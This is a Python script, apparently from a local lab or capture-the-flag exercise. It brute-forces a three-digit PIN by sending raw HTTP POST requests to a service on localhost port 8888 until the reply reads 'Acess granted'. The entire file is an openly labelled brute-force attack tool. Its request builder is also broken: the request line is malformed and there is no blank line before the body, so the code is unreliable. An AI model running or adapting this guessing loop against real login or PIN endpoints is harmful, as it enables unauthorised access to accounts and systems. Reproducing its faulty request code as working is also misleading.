import socket
import time

def create_post_request(pin):
    return f""" POST /HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(f"pin={pin}")}
pin={pin}"""

def try_pin(s,pin):
    formated_pin = f"{pin:03d}"
    request = create_post_request(formated_pin)
    
    try: 
        s.send(request.encode())
        
        response = s.recv(1024).decode()
        if "Acess granted" in response:
            print(f"PIN {formated_pin} is correct!")
            return True
        
        print(f"PIN {formated_pin} is incorrect.")
        return False
    
    except socket.error as e:
        print(f"Socket error: {e}")
        return False
    
def main():
    host = 'localhost'
    port = 8888
    
    print("Starting brute force attack...")
    for pin in range(1000):
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))
                print(f"Trying PIN: {pin}")
                
                if try_pin(s, pin):
                    break
        except ConnectionAbortedError:
            print("Connection aborted. Retrying...")
            break
        except socket.error as e:
            print(f"Socket error: {e}")
            continue
        
if __name__ == "__main__":
    main()

